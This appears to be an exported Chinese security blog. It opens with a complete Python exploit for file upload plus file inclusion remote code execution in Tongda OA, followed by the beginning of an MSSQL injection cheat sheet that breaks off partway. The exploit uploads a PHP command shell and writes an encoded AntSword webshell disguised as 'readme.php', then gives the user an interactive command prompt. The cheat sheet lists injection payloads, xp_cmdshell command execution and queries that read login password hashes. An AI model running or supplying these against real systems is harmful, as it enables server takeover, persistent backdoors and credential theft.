<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># FileName  :  tongda_oa_rce.py</span></span><br><span class="line"><span class="comment"># Time      :  2020/03/24 10:39:18</span></span><br><span class="line"><span class="comment"># Author    :  OuDeNiu</span></span><br><span class="line"><span class="comment"># Email     :  havebutno@gmail.com</span></span><br><span class="line"><span class="comment"># Version   :  1.0</span></span><br><span class="line"><span class="comment"># Descript  :  安装环境不同，路径不同。测试环境 -&gt; Win10 / OA 2017</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD马</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_shell</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;1.txt&#x27;</span>):</span><br><span class="line">        f=open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$command=$_POST[&#x27;tdoa&#x27;];</span></span><br><span class="line"><span class="string">$wsh = new COM(&#x27;WScript.shell&#x27;);</span></span><br><span class="line"><span class="string">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span></span><br><span class="line"><span class="string">$stdout = $exec-&gt;StdOut();</span></span><br><span class="line"><span class="string">$stroutput = $stdout-&gt;ReadAll();</span></span><br><span class="line"><span class="string">echo $stroutput;</span></span><br><span class="line"><span class="string">?&gt;&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入蚁剑马</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_ant</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;1.txt&#x27;</span>):</span><br><span class="line">        f=open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">        $fp = fopen(&#x27;readme.php&#x27;, &#x27;w&#x27;);</span></span><br><span class="line"><span class="string">        $a = base64_decode(&quot;JTNDJTNGcGhwJTIwJTBBY2xhc3MlMjBXRVdEJTIwJTdCJTIwJTBBJTIwJTIwJTIwJTIwZnVuY3Rpb24lMjBvQnZyJTI4JTI5JTIwJTdCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTI0d0FiRiUyMCUzRCUyMCUyMiU1Q3hlNiUyMiUyMCU1RSUyMCUyMiU1Q3g4NyUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyNHBsRVclMjAlM0QlMjAlMjIlNUN4MTglMjIlMjAlNUUlMjAlMjIlNUN4NmIlMjIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjRiZVVoJTIwJTNEJTIwJTIyJTVDeGZlJTIyJTIwJTVFJTIwJTIyJTVDeDhkJTIyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTI0RnpJWiUyMCUzRCUyMCUyMiU1Q3g3MiUyMiUyMCU1RSUyMCUyMiU1Q3gxNyUyMiUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyNGx2S0MlMjAlM0QlMjAlMjIlNUN4MmQlMjIlMjAlNUUlMjAlMjIlNUN4NWYlMjIlM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjRSR1ZLJTIwJTNEJTIwJTIyJTVDeGQwJTIyJTIwJTVFJTIwJTIyJTVDeGE0JTIyJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTI0TGlQdSUyMCUzRCUyNHdBYkYuJTI0cGxFVy4lMjRiZVVoLiUyNEZ6SVouJTI0bHZLQy4lMjRSR1ZLJTNCJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwcmV0dXJuJTIwJTI0TGlQdSUzQiUwQSUyMCUyMCUyMCUyMCU3RCUwQSUyMCUyMCUyMCUyMGZ1bmN0aW9uJTIwX19kZXN0cnVjdCUyOCUyOSU3QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyNHpwY1QlM0QlMjR0aGlzLSUzRW9CdnIlMjglMjklM0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBAJTI0enBjVCUyOCUyNHRoaXMtJTNFQUQlMjklM0IlMEElMjAlMjAlMjAlMjAlN0QlMEElN0QlMEElMjR3ZXdkJTIwJTNEJTIwbmV3JTIwV0VXRCUyOCUyOSUzQiUwQUAlMjR3ZXdkLSUzRUFEJTIwJTNEJTIwaXNzZXQlMjglMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklM0ZiYXNlNjRfZGVjb2RlJTI4JTI0X1BPU1QlNUIlMjd0ZG9hJTI3JTVEJTI5JTNBJTI0X1BPU1QlNUIlMjd0ZG9hJTI3JTVEJTNCJTBBJTNGJTNF&quot;);</span></span><br><span class="line"><span class="string">        fwrite($fp, urldecode($a));</span></span><br><span class="line"><span class="string">        fclose($fp);</span></span><br><span class="line"><span class="string">        ?&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除当前目录下生成的马</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_shell</span>():</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;1.txt&#x27;</span>):</span><br><span class="line">        os.remove(<span class="string">&#x27;1.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce_1</span>(<span class="params">url,cmd,shell</span>):</span></span><br><span class="line">    upload_url = url+ <span class="string">&quot;/ispirit/im/upload.php&quot;</span></span><br><span class="line">    include_url = url + <span class="string">&quot;/ispirit/interface/gateway.php&quot;</span></span><br><span class="line">    shell_url= url + <span class="string">&quot;/ispirit/interface/readme.php&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上传文件</span></span><br><span class="line">    <span class="keyword">if</span> int(shell) == <span class="number">0</span>:</span><br><span class="line">        write_shell()</span><br><span class="line">        files = &#123;<span class="string">&#x27;ATTACHMENT&#x27;</span>:open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125;</span><br><span class="line">        upload_data=&#123;<span class="string">&quot;P&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;DEST_UID&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;UPLOAD_MODE&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;</span><br><span class="line">        <span class="comment"># 上传</span></span><br><span class="line">        upload_res = requests.post(upload_url,upload_data,files=files)</span><br><span class="line">        path = upload_res.text</span><br><span class="line">        path = path[path.find(<span class="string">&#x27;@&#x27;</span>)+<span class="number">1</span>:path.rfind(<span class="string">&#x27;|&#x27;</span>)].replace(<span class="string">&quot;_&quot;</span>,<span class="string">&quot;/&quot;</span>).replace(<span class="string">&quot;|&quot;</span>,<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> cmd !=<span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            cmd = input(<span class="string">&quot;[Cmd]:&quot;</span>)</span><br><span class="line">            include_data = &#123;<span class="string">&quot;json&quot;</span>:<span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;/general/../../attach/im/&quot;</span> +path+<span class="string">&quot;\&quot;&#125;&quot;</span>,<span class="string">&quot;tdoa&quot;</span>:cmd&#125;</span><br><span class="line">            <span class="comment"># 文件包含</span></span><br><span class="line">            include_res = requests.post(include_url,data=include_data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;403&quot;</span> <span class="keyword">in</span> include_res.text <span class="keyword">or</span> <span class="string">&quot;No input file&quot;</span> <span class="keyword">in</span> include_res.text:</span><br><span class="line">                include_url = url + <span class="string">&quot;/mac/gateway.php&quot;</span></span><br><span class="line">                <span class="comment"># shell_url= url + &quot;/mac/readme.php&quot;</span></span><br><span class="line">                include_res = requests.post(include_url,data=include_data)</span><br><span class="line">                print(include_res.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(include_res.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GetShell</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        write_ant()</span><br><span class="line">        files = &#123;<span class="string">&#x27;ATTACHMENT&#x27;</span>:open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125;</span><br><span class="line">        upload_data=&#123;<span class="string">&quot;P&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;DEST_UID&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;UPLOAD_MODE&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;</span><br><span class="line">        upload_res = requests.post(upload_url,upload_data,files=files)</span><br><span class="line">        path = upload_res.text</span><br><span class="line">        path = path[path.find(<span class="string">&#x27;@&#x27;</span>)+<span class="number">1</span>:path.rfind(<span class="string">&#x27;|&#x27;</span>)].replace(<span class="string">&quot;_&quot;</span>,<span class="string">&quot;/&quot;</span>).replace(<span class="string">&quot;|&quot;</span>,<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        include_data = &#123;<span class="string">&quot;json&quot;</span>:<span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;/general/../../attach/im/&quot;</span> +path+<span class="string">&quot;\&quot;&#125;&quot;</span>&#125;</span><br><span class="line">        <span class="comment"># 文件包含</span></span><br><span class="line">        include_res = requests.post(include_url,data=include_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;403&quot;</span> <span class="keyword">in</span> include_res.text <span class="keyword">or</span> <span class="string">&quot;No input file&quot;</span> <span class="keyword">in</span> include_res.text:</span><br><span class="line">            include_url = url + <span class="string">&quot;/mac/gateway.php&quot;</span></span><br><span class="line">            shell_url= url + <span class="string">&quot;/mac/readme.php&quot;</span></span><br><span class="line">            include_res = requests.post(include_url,data=include_data)</span><br><span class="line">        shell_res=requests.get(shell_url)</span><br><span class="line">        <span class="keyword">if</span> shell_res.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&#x27;[+]成功GetShell:&#x27;</span>+url+<span class="string">&#x27;/mac/readme.php&#x27;</span>)</span><br><span class="line">            print(shell_res.text)</span><br><span class="line">        <span class="keyword">else</span>:print(<span class="string">&#x27;[-]写入shell失败&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[*]通达OA文件上传+文件包含 RCE</span></span><br><span class="line"><span class="string">Usage:python3 http://xxxxxxx.com Options</span></span><br><span class="line"><span class="string">0:Exec CMD &#123;q -&gt; quit&#125;</span></span><br><span class="line"><span class="string">1:Get Shell &#123;AntSword -&gt; tdoa&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">print(banner)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    other = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    exit(<span class="string">&#x27;[-]参数错误&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> int(other) != <span class="number">0</span>:</span><br><span class="line">    shell = other</span><br><span class="line"><span class="keyword">else</span>:shell = <span class="number">0</span></span><br><span class="line">rce_1(url,<span class="literal">None</span>,shell)</span><br><span class="line">del_shell()</span><br></pre></td></tr></table></figure>

<p>滴滴滴：原本是有图片的，但是莫名其妙的不见了，环境已经删了，所以。。。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>通达</tag>
        <tag>文件上传</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>MSSQL小结</title>
    <url>/posts/546e1e49/</url>
    <content><![CDATA[<p>MSSQL是指微软的SQL Server数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属关系型数据库。</p>
<a id="more"></a>

<h1 id="SQL-Server手工注入"><a href="#SQL-Server手工注入" class="headerlink" title="SQL Server手工注入"></a>SQL Server手工注入</h1><p>MSSQL是指微软的SQL Server数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属关系型数据库</p>
<p>MSSQL中每个库都有一个系统自带表–&gt;sysobjects</p>
<p>此系统表中对我们有用的只有3个字段，NAME字段和XTYPE字段和ID字段，name就是表名信息，xtype是代表表的类型，只有两个参数，S代表系统自带表，U代表用户创建的表，id字段的值用来连接syscolumns表</p>
<h2 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h2><p>三个权限：<code>sysadmin</code>、<code>db_owner</code>、<code>public</code></p>
<ul>
<li>sysadmin：可以执行所有操作</li>
<li>db_owner：可以执行数据库操作</li>
<li>public：只能执行查询操作</li>
</ul>
<h3 id="数据库判断"><a href="#数据库判断" class="headerlink" title="数据库判断"></a>数据库判断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;and user&gt;0</span><br><span class="line">;and (select count(*) from sysobjects)&gt;0 mssql</span><br><span class="line">;and (select count(*) from msysobjects)&gt;0 access</span><br></pre></td></tr></table></figure>

<h3 id="常用函数-语句"><a href="#常用函数-语句" class="headerlink" title="常用函数/语句"></a>常用函数/语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if() </span><br><span class="line">exists()</span><br><span class="line">SysDatabases		-- 主数据库服务器中的数据库. 初安装 SQL Server 时,sysdatabases 包含 master,model,msdb,mssqlweb和tempdb数据库的项。该表只存储在 master 数据库中。</span><br><span class="line">SysObjects 			--在数据库内创建的每个对象（约束、默认值、日志、规则、存储过程等）在表中占一行。只有在 tempdb 内，每个临时对象才在该表中占一行。</span><br><span class="line">SysColumns			-- 每个数据库创建后都会有一些系统表用来存储该数据库的一些基本信息。每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行。</span><br><span class="line">select @@version -- 版v本</span><br><span class="line">select db_name() -- 库名</span><br><span class="line">select user -- 用户名</span><br><span class="line">select @@SERVERNAME -- 服务器主机名</span><br><span class="line">select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) --判断是不是管理员，是则返回1 ，否返回0</span><br><span class="line">exec master..xp_cmdshell &quot;ipconfig&quot; --调用xp_cmdshell执行系统命令</span><br><span class="line"></span><br><span class="line">Select Name FROM Master..SysDatabases order by Name -- 获取所有数据库名</span><br><span class="line">Select Name FROM SysObjects Where XType&#x3D;&#39;U&#39; orDER BY Name  -- 当前库的表名</span><br><span class="line">-- XType&#x3D;&#39;U&#39;:表示所有用户表; </span><br><span class="line">-- XType&#x3D;&#39;S&#39;:表示所有系统表;</span><br><span class="line">Select Name FROM SysColumns Where id&#x3D;Object_Id(&#39;表名&#39;) -- 指定表的字段名</span><br></pre></td></tr></table></figure>

<h3 id="SysDatabases介绍"><a href="#SysDatabases介绍" class="headerlink" title="SysDatabases介绍"></a>SysDatabases介绍</h3><p><code>SysDatabases</code>主数据库服务器中的数据库. 初安装 SQL Server 时,sysdatabases 包含 master,model,msdb,mssqlweb和tempdb数据库的项。该表只存储在 master 数据库中。表结构如下：</p>
<table>
<thead>
<tr>
<th><strong>列名</strong></th>
<th><strong>数据类型</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>sysname</td>
<td>数据库的名称。</td>
</tr>
<tr>
<td>dbid</td>
<td>smallint</td>
<td>数据库 ID。</td>
</tr>
<tr>
<td>sid</td>
<td>varbinary(85)</td>
<td>数据库创建者的系统 ID。</td>
</tr>
<tr>
<td>mode</td>
<td>smallint</td>
<td>用于创建数据库时在内部锁定该数据库。</td>
</tr>
<tr>
<td>status</td>
<td>int</td>
<td>状态位，其中某些状态位可由用户使用 sp_dboption  （ read only  、 dbo use only  、 single user  等）进行设置：  <br>1 = autoclose  ；使用 sp_dboption  设置。 <br> 4 = select into/bulkcopy ；使用 sp_dboption  设置。 <br> 8 = trunc. log on chkpt ；使用 sp_dboption  设置。  <br>16 = torn page detection ，使用 sp_dboption  设置。 <br> 32 = loading  。  <br>64 = pre recovery  。 <br> 128 = recovering  。 <br> 256 = not recovered  。  <br>512 = offline  ；使用 sp_dboption  设置。 <br> 1024 = read only  ；使用 sp_dboption  设置。 <br> 2048 = dbo use only  ；使用 sp_dboption  设置。 <br> 4096 = single user  ；使用 sp_dboption  设置。  <br>32768 = emergency mode 。 <br>4194304 = autoshrink  。  <br>1073741824 = cleanly shutdown 。 <br>可以同时打开多个位。</td>
</tr>
<tr>
<td>status2</td>
<td>int</td>
<td>16384 = ANSI null default ；使用 sp_dboption  设置。  <br>65536 = concat null yields null ，使用 sp_dboption  设置。  <br>131072 = recursive triggers ，使用 sp_dboption  设置。  <br>1048576 = default to local cursor ，使用 sp_dboption  设置。 <br> 8388608 = quoted identifier ，使用 sp_dboption  设置。  <br>33554432 = cursor close on commit ，使用 sp_dboption  设置。  <br>67108864 = ANSI nulls  ,使用 sp_dboption  设置。  <br>268435456 = ANSI warnings  ，使用 sp_dboption  设置。  <br>536870912 = full text enabled ，使用  sp_fulltext_database 设置。</td>
</tr>
<tr>
<td>crdate</td>
<td>datetime</td>
<td>创建日期。</td>
</tr>
<tr>
<td>reserved</td>
<td>datetime</td>
<td>留作以后使用。</td>
</tr>
<tr>
<td>category</td>
<td>int</td>
<td>包含用于复制的信息位图：  1 =  已发布。  2 = 已订阅。  4 = 合并已发布。  8 = 合并已订阅。</td>
</tr>
<tr>
<td>cmptlevel</td>
<td>tinyint</td>
<td>数据库的兼容级别。</td>
</tr>
<tr>
<td>filename</td>
<td>nvarchar(260)</td>
<td>数据库主文件的操作系统路径和名称。</td>
</tr>
<tr>
<td>version</td>
<td>smallint</td>
<td>创建数据库时使用的 SQL Server 代码内部版本号。仅供 SQL Server 工具在内部用于升级处理。</td>
</tr>
</tbody></table>
<h3 id="SysObjects介绍"><a href="#SysObjects介绍" class="headerlink" title="SysObjects介绍"></a>SysObjects介绍</h3><p><code>SysObjects</code>,在数据库内创建的每个对象（约束、默认值、日志、规则、存储过程等）在表中占一行。只有在 tempdb 内，每个临时对象才在该表中占一行。表结构如下：</p>
<table>
<thead>
<tr>
<th><strong>列名</strong></th>
<th><strong>数据类型</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>sysname</td>
<td>对象名,常用列</td>
</tr>
<tr>
<td>id</td>
<td>int</td>
<td>对象标识号</td>
</tr>
<tr>
<td><strong>xtype</strong></td>
<td>char(2)</td>
<td>对象类型。常用列。<strong>xtype</strong>可以是下列对象类型中的一种：   <br>C = CHECK 约束　　<br>D = 默认值或 DEFAULT 约束　　<br>F = FOREIGN KEY 约束　　<br>L = 日志　　<br>FN = 标量函数   <br>IF = 内嵌表函数 　<br>P = 存储过程 　<br>PK = PRIMARY KEY 约束（类型是 K） 　<br>RF = 复制筛选存储过程  <br> S = 系统表 　<br>TF = 表函数 　<br>TR = 触发器 　<br>U = 用户表 　<br>UQ = UNIQUE 约束（类型是 K）  <br> V = 视图 　<br>X = 扩展存储过程</td>
</tr>
<tr>
<td>uid</td>
<td>smallint</td>
<td>所有者用户对象编号</td>
</tr>
<tr>
<td>info</td>
<td>smallint</td>
<td>保留。仅限内部使用</td>
</tr>
<tr>
<td>status</td>
<td>int</td>
<td>保留。仅限内部使用</td>
</tr>
<tr>
<td>base_schema_ ver</td>
<td>int</td>
<td>保留。仅限内部使用</td>
</tr>
<tr>
<td>replinfo</td>
<td>int</td>
<td>保留。供复制使用</td>
</tr>
<tr>
<td>parent_obj</td>
<td>int</td>
<td>父对象的对象标识号（例如，对于触发器或约束，该标识号为表 ID）。</td>
</tr>
<tr>
<td>crdate</td>
<td>datetime</td>
<td>对象的创建日期。</td>
</tr>
<tr>
<td>ftcatid</td>
<td>smallint</td>
<td>为全文索引注册的所有用户表的全文目录标识符，对于没有注册的所有用户表则为 0</td>
</tr>
<tr>
<td>schema_ver</td>
<td>int</td>
<td>版本号，该版本号在每次表的架构更改时都增加。</td>
</tr>
<tr>
<td>stats_schema_ ver</td>
<td>int</td>
<td>保留。仅限内部使用。</td>
</tr>
<tr>
<td>type</td>
<td>char(2)</td>
<td>对象类型。可以是下列值之一：   <br>C = CHECK 约束  <br>D = 默认值或 DEFAULT 约束 <br>F = FOREIGN KEY 约束   <br>FN = 标量函数 <br>IF = 内嵌表函数  <br>K = PRIMARY KEY 或 UNIQUE 约束   <br>L = 日志 <br>P = 存储过程 <br>R = 规则  <br>RF = 复制筛选存储过程   <br>S = 系统表  <br>TF = 表函数 <br>TR = 触发器 <br>U = 用户表 <br>V = 视图 <br>X = 扩展存储过程</td>
</tr>
<tr>
<td>userstat</td>
<td>smallint</td>
<td>保留。</td>
</tr>
<tr>
<td>sysstat</td>
<td>smallint</td>
<td>内部状态信息</td>
</tr>
<tr>
<td>indexdel</td>
<td>smallint</td>
<td>保留</td>
</tr>
<tr>
<td>refdate</td>
<td>datetime</td>
<td>留用</td>
</tr>
<tr>
<td>version</td>
<td>int</td>
<td>保留</td>
</tr>
<tr>
<td>deltrig</td>
<td>int</td>
<td>保留</td>
</tr>
<tr>
<td>instrig</td>
<td>int</td>
<td>保留</td>
</tr>
<tr>
<td>updtrig</td>
<td>int</td>
<td>保留</td>
</tr>
<tr>
<td>seltrig</td>
<td>int</td>
<td>保留</td>
</tr>
<tr>
<td>category</td>
<td>int</td>
<td>用于发布、约束和标识</td>
</tr>
<tr>
<td>cache</td>
<td>smallint</td>
<td>保留</td>
</tr>
</tbody></table>
<h3 id="SysColumns介绍"><a href="#SysColumns介绍" class="headerlink" title="SysColumns介绍"></a>SysColumns介绍</h3><p><code>SysColumns</code>每个数据库创建后都会有一些系统表用来存储该数据库的一些基本信息。每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行。该表位于每个数据库中。表结构如下：</p>
<table>
<thead>
<tr>
<th>列名</th>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>sysname</td>
<td>列名或过程参数的名称。</td>
</tr>
<tr>
<td>id</td>
<td>int</td>
<td>该列所属的表对象 ID，或与该参数关联的存储过程 ID。</td>
</tr>
<tr>
<td>xtype</td>
<td>tinyint</td>
<td>systypes 中的物理存储类型。</td>
</tr>
<tr>
<td>typestat</td>
<td>tinyint</td>
<td>仅限内部使用。</td>
</tr>
<tr>
<td>xusertype</td>
<td>smallint</td>
<td>扩展的用户定义数据类型 ID。</td>
</tr>
<tr>
<td>length</td>
<td>smallint</td>
<td>systypes 中的最大物理存储长度。</td>
</tr>
<tr>
<td>xprec</td>
<td>tinyint</td>
<td>仅限内部使用。</td>
</tr>
<tr>
<td>xscale</td>
<td>tinyint</td>
<td>仅限内部使用。</td>
</tr>
<tr>
<td>colid</td>
<td>smallint</td>
<td>列或参数 ID。</td>
</tr>
<tr>
<td>xoffset</td>
<td>smallint</td>
<td>仅限内部使用。</td>
</tr>
<tr>
<td>bitpos</td>
<td>tinyint</td>
<td>仅限内部使用。</td>
</tr>
<tr>
<td>reserved</td>
<td>tinyint</td>
<td>仅限内部使用。</td>
</tr>
<tr>
<td>colstat</td>
<td>smallint</td>
<td>仅限内部使用。</td>
</tr>
<tr>
<td>cdefault</td>
<td>int</td>
<td>该列的默认值 ID。</td>
</tr>
<tr>
<td>domain</td>
<td>int</td>
<td>该列的规则或 CHECK 约束 ID。</td>
</tr>
<tr>
<td>number</td>
<td>smallint</td>
<td>过程分组时（0 表示非过程项）的子过程号。</td>
</tr>
<tr>
<td>colorder</td>
<td>smallint</td>
<td>仅限内部使用。</td>
</tr>
<tr>
<td>autoval</td>
<td>varbinary(255)</td>
<td>仅限内部使用。</td>
</tr>
<tr>
<td>offset</td>
<td>smallint</td>
<td>该列所在行的偏移量；如果为负，表示可变长度行。</td>
</tr>
<tr>
<td>status</td>
<td>tinyint</td>
<td>用于描述列或参数属性的位图： <br>0x08 = 列允许空值。 <br>0x10 = 当添加 varchar 或 varbinary列时，ANSI 填充生效。保留 varchar 列的尾随空格，保留 varbinary 列的尾随零。 <br>0x40 = 参数为 OUTPUT 参数。 <br>0x80 = 列为标识列。</td>
</tr>
<tr>
<td>type</td>
<td>tinyint</td>
<td>systypes 中的物理存储类型。</td>
</tr>
<tr>
<td>usertype</td>
<td>smallint</td>
<td>systypes 中的用户定义数据类型 ID。</td>
</tr>
<tr>
<td>printfmt</td>
<td>varchar(255)</td>
<td>仅限内部使用。</td>
</tr>
<tr>
<td>prec</td>
<td>smallint</td>
<td>该列的精度级别。</td>
</tr>
<tr>
<td>scale</td>
<td>int</td>
<td>该列的小数位数。</td>
</tr>
<tr>
<td>iscomputed</td>
<td>int</td>
<td>表示是否已计算该列的标志： 0 = 未计算。 1 = 已计算。</td>
</tr>
<tr>
<td>isoutparam</td>
<td>int</td>
<td>表示该过程参数是否是输出参数： 1 = 真。 0 = 假。</td>
</tr>
<tr>
<td>isnullable</td>
<td>int</td>
<td>表示该列是否允许空值： 1 = 真。 0 = 假。</td>
</tr>
</tbody></table>
<h3 id="默认数据库"><a href="#默认数据库" class="headerlink" title="默认数据库"></a>默认数据库</h3><table>
<thead>
<tr>
<th>库名</th>
<th>适用版本</th>
</tr>
</thead>
<tbody><tr>
<td>pubs</td>
<td>不适用于MSSQL 2005</td>
</tr>
<tr>
<td>model</td>
<td>适用于所有版本</td>
</tr>
<tr>
<td>msdb</td>
<td>适用于所有版本</td>
</tr>
<tr>
<td>tempdb</td>
<td>适用于所有版本</td>
</tr>
<tr>
<td>northwind</td>
<td>适用于所有版本</td>
</tr>
<tr>
<td>information_schema</td>
<td>适用于MSSQL 2000及更高版本</td>
</tr>
</tbody></table>
<h3 id="注释风格"><a href="#注释风格" class="headerlink" title="注释风格"></a>注释风格</h3><table>
<thead>
<tr>
<th>注释符</th>
<th>注释风格</th>
</tr>
</thead>
<tbody><tr>
<td>/ *</td>
<td>C语言风格注释</td>
</tr>
<tr>
<td>–</td>
<td>SQL注释</td>
</tr>
<tr>
<td>; 00％</td>
<td>空字节</td>
</tr>
</tbody></table>
<h3 id="数据库凭据"><a href="#数据库凭据" class="headerlink" title="数据库凭据"></a>数据库凭据</h3><table>
<thead>
<tr>
<th>类型</th>
<th>数据库标识</th>
</tr>
</thead>
<tbody><tr>
<td>数据库表</td>
<td>master..syslogins, master..sysprocesses</td>
</tr>
<tr>
<td>列名</td>
<td>name, loginame</td>
</tr>
<tr>
<td>当前用户</td>
<td>user, system_user, suser_sname(), is_srvrolemember(‘sysadmin’)</td>
</tr>
<tr>
<td>数据库凭据</td>
<td>SELECT user, password FROM master.dbo.sysxlogins  # 注意权限</td>
</tr>
</tbody></table>
<h2 id="显性注入"><a href="#显性注入" class="headerlink" title="显性注入"></a>显性注入</h2><p>该示例使用在线环境测试：<span class="exturl" data-url="aHR0cHM6Ly9yZXh0ZXN0ZXIuY29tL2wvc3FsX3NlcnZlcl9vbmxpbmVfY29tcGlsZXI=">https://rextester.com/l/sql_server_online_compiler<i class="fa fa-external-link-alt"></i></span></p>
<p>(本小节中语句均为自己构造。)</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul>
<li>首先确定字段数<code>order by N--</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 确定字段数</span><br><span class="line">select ProductID from t where ProductID&#x3D;68 order by 1 --</span><br><span class="line"></span><br><span class="line">-- 确定可利用字段数 （这里两个字段名一样为了假装多个字段。。。）</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union select 1,2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查询数据库</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 查询当前库</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union Select 1,db_name()</span><br><span class="line"></span><br><span class="line">-- 依次使用 !&#x3D; 查询数据库名称</span><br><span class="line">select ProductID,ProductID from t where ProductID&#x3D;68 and 1&#x3D;2 union Select 1,Name FROM Master..SysDatabases where name !&#x3D; &#39;master&#39; and name !&#x3D; &#39;model&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>查询表</li>
</ul>
